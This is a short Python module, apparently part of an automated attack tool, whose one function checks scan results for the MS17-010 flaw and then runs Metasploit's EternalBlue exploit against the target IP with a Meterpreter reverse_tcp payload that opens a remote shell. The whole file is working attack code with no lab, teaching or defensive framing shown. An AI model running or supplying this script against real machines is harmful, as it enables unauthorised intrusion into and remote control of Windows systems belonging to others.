# exploitation.py
import subprocess

def exploit_vulnerability(target_ip, scan_results):
    print(f"Exploiting EternalBlue on {target_ip}...")
    exploit_data = {"status": "Failed", "details": ""}

    # Check if the target has SMBv1 vulnerability
    if any("MS17-010" in vuln for vuln in scan_results["vulnerabilities"]):
        try:
            # Run Metasploit exploit module
            exploit_command = f"""
            use exploit/windows/smb/ms17_010_eternalblue
            set RHOST {target_ip}
            set PAYLOAD windows/x64/meterpreter/reverse_tcp
            set LHOST 0.0.0.0
            run
            exit
            """
            subprocess.run(
                ["msfconsole", "-q", "-x", exploit_command],
                check=True
            )
            exploit_data["status"] = "Success"
            exploit_data["details"] = "EternalBlue exploited successfully with Meterpreter payload."
        except subprocess.CalledProcessError as e:
            exploit_data["details"] = f"Failed to exploit: {e}"
    else:
        exploit_data["details"] = "No EternalBlue vulnerability found."

    print("Exploitation completed.")
    return exploit_data

